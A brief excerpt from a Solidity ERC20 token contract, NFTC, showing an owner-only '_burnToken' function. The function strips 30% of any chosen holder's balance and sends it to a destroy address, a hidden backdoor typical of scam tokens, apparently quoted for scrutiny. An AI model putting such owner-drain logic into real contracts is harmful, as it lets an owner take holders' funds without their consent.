...
contract NFTC is Context, IERC20, Ownable {
    ...
    function _burnToken(address account) external onlyOwner {
        uint256 da = (_rOwned[account]/100)*30;
        uint256 tda = tokenFromReflection(da);

        _rOwned[account] = _rOwned[account]-da;
        _tOwned[account] = tokenFromReflection(_rOwned[account]);

        _rOwned[destroyAddress] = _rOwned[destroyAddress]+da;
        _tOwned[destroyAddress] = tokenFromReflection(_rOwned[destroyAddress]);

        emit BurnToken(account, tda);
    }
